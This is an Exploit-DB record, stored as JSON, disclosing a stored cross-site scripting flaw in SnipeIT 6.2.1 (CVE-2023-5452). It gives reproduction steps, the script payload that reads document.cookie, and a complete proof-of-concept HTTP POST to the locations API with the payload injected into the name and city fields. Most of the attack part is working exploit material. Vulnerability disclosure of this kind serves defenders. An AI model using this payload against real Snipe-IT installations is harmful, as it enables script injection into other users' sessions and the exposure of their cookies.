{"source": "https://www.exploit-db.com/exploits/51883", "vulnName": "SnipeIT 6.2.1 - Stored Cross Site Scripting", "vulnEDBID": "51883", "vulnCVE": "N/A", "author": "SHAHZAIB ALI KHAN", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2024-03-12", "vulnContent": "Exploit Title: SnipeIT 6.2.1 - Stored Cross Site Scripting\nDate: 06-Oct-2023\nExploit Author: Shahzaib Ali Khan\nVendor Homepage: https://snipeitapp.com\nSoftware Link: https://github.com/snipe/snipe-it/releases/tag/v6.2.1\nVersion: 6.2.1\nTested on: Windows 11 22H2 and Ubuntu 20.04\nCVE: CVE-2023-5452\n\nDescription: SnipeIT 6.2.1 is affected by a stored cross-site scripting\n(XSS) feature that allows attackers to execute JavaScript commands. The\nlocation endpoint was vulnerable.\n\nSteps to Reproduce:\n\n1. Login as a standard user [non-admin] > Asset page > List All\n2. Click to open any asset > Edit Asset\n3. Create new location and add the payload:\n<script>alert(document.cookie)</script>\n4. Now login to any other non-admin or admin > Asset page > List All\n5. Open the same asset of which you can change the location and the payload\nwill get executed.\n\nPOC Request:\n\nPOST /api/v1/locations HTTP/1.1\nHost: localhost\nContent-Length: 118\nAccept: */*\nX-CSRF-TOKEN: CDJkvGNWzFKFueeNx0AQMJIhhXJGZmKG1SFeVEGV\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n(KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nOrigin: http://localhost\nReferer: http://localhost/hardware/196/edit\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nCookie: snipeit_session=AHw3ARN6pdg90xU4ovG1FBZywycKPLIxjTUfmELO;\nassetsListingTable.bs.table.cardView=false; laravel_token=\neyJpdiI6IitpM1RXVEVEVGNLZzRTd28wYmhZblE9PSIsInZhbHVlIjoickJocmNYTzNOS3JYdkdhSmpJME1GRmJYMi9DUnVkaStDTzBnbHZDVG1xNVAvbTA5cjJHM1FTbi95SEVzNmNnNzdKNHY5em5pK3\nZjQ2F3VnB6RnhJRCs4NkV6NW16RnRWb3M0cXBuT2ZpZExoQ3JrN1VIVHB3cWV5NUtBRWZ4OXBsdEx4R0hSeElLV1BEbWk2WGxiWEBOMDg5cGFySj1rSnENckx3bXg2Qi9KQzFvNGJJTktjTVUw0EI4YVNM\nd2UxdW1TelBDV1ByUk9yeTFOUDR1cS9SV2tFRi9LOG1iZGVweUxJdGhHTXRLSnFvTU82QVIvREphS215bkRtKzM5M1RVQ21nVENsT1M1Mn1FUT1TbFkOVDVPbHd4a3BFQW1YQkY3NFR2bzRQSGZIelppa0\n01MGYvSmFrbXVGWHpV0FMiLCJtYWMi0iJjZjMwMmQ4ZTB1NmM4MDU5YzU4MTYzZTgxNTcx0WEwYmM2Y2EyMmRlYzZhMmE2ZjI1NzIxYjc4NmIxNjRiOWM5IiwidGFnIjoiIn0%3D;\nXSRF-TOKEN=\neyJpdiI6IjNmMVpNUEpDNCtpV0pHKOczZDRSUmc9PSIsInZhbHVlIjoiWXYvZkY2bTk4MONsUUFZQjZiVWtPdm1JRE1WWmpBd2tsZWNJblgxZWg3dONYL2x0Zkxib3N5Y1N5YmRYVm1XUm91N3pES1F1bH\nFWMEV1Y2xsZ1VqZ1FYdmdYcjJRZXZMZG9NYmpWY2htL2tPdXNBQUdEbjVHSEVjV2tzKOpYelEiLCJtYWMi0iI1YzhkNmQ2NDAxNmZkYTQ1NzVhZmI5OGY3ODA3MDkOOTc4ZWVhYmMiZWIYMjZhZGZiZWI5\nMjMOMGJjZDBkNzU4IiwidGFnIjoiIn0%3D\nConnection: close\n\nname=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&city=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&country=\n\n\n\nThanks,\nShahzaib Ali Khan\n            "}